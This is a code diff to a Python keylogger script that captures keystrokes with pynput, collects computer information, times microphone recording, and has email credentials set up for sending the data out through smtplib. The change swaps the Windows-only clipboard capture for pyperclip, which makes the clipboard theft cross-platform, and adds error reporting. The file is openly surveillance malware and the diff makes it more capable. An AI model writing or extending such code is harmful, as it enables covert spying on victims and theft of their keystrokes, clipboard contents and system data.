@@ -7,7 +7,7 @@ import smtplib
 import socket
 import platform
 
-import win32clipboard
+import pyperclip
 
 from pynput.keyboard import Key, Listener
 
@@ -39,8 +39,8 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = " " # Enter disposable email here
-password = " " # Enter email password here
+email_address = " " # Enter disposable email 
+password = " " # Enter email password
 
 username = getpass.getuser()
 
@@ -116,18 +116,13 @@ def computer_information():
 
 computer_information()
 
-# get the clipboard contents
 def copy_clipboard():
     with open(file_path + extend + clipboard_information, "a") as f:
         try:
-            win32clipboard.OpenClipboard()
-            pasted_data = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
-
+            pasted_data = pyperclip.paste()
             f.write("Clipboard Data: \n" + pasted_data)
-
-        except:
-            f.write("Clipboard could be not be copied")
+        except Exception as e:
+            f.write("Clipboard could not be copied. Error: " + str(e))
 
 copy_clipboard()
 
